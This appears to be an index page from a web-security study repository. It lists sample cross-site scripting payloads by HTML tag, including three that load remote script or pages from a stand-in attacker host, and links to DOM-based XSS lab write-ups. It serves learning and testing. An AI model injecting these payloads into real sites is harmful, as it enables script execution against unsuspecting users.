# XSS

### Common JavaScript language elements used in malicious payloads to perform cross-site scripting attacks include:

  - The `<script>` tag:
- `<script src=http://attacker.example.com/xss.js></script>`
- `<script> alert("XSS");</script>`
  - The `onload` and `onerror` attributes:
- `<img src=x onerror=alert("XSS")>`
- `<body onload=alert("XSS")>`
  - The `<body>` tag attributes:
- `<body background="javascript:alert("XSS")">`
  - The `<img>` tag attributes:
- `<img src="javascript:alert("XSS");">`
- `<img dynsrc="javascript:alert('XSS')">`
- `<img lowsrc="javascript:alert('XSS')">`
  - The `<iframe>` tag:
- `<iframe src="http://attacker.example.com/xss.html">`
  - The `<input>` tag attributes:
- `<input type="image" src="javascript:alert('XSS');">`
  - The `<link>` tag:
- `<link rel="stylesheet" href="javascript:alert('XSS');">`
  - The `<table>` and `<td>` tag attributes:
- `<table background="javascript:alert('XSS')">`
- `<td background="javascript:alert('XSS')">`
  - The `<div>` tag attributes:
- `<div style="background-image: url(javascript:alert('XSS'))">`
- `<div style="width: expression(alert('XSS'));">`
  - The `<object>` tag:
- `<object type="text/x-scriptlet" data="http://attacker.example.com/xss.html">`

## Labs

- [DOM-based XSS](./DOM-based_XSS.md)
- [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](./DOM_XSS_in_AngularJS_expression_with_angle_brackets_and_double_quotes_HTML-encoded.md)
- [DOM XSS in documentwrite sink using source locationsearch](./DOM_XSS_in_documentwrite_sink_using_source_locationsearch.md)
- [DOM XSS in documentwrite sink using source locationsearch inside a select element](./DOM_XSS_in_documentwrite_sink_using_source_locationsearch_inside_a_select_element.md)
- [DOM XSS in innerHTML sink using source locationsearch](./DOM_XSS_in_innerHTML_sink_using_source_locationsearch.md)
- [DOM XSS in jQuery anchor href attribute sink using locationsearch source](./DOM_XSS_in_jQuery_anchor_href_attribute_sink_using_locationsearch_source.md)
- [DOM XSS in jQuery selector sink using a hashchange event](./DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event.md)
- [Reflected DOM XSS](./Reflected_DOM_XSS.md)
- [Stored DOM XSS](./Stored_DOM_XSS.md)
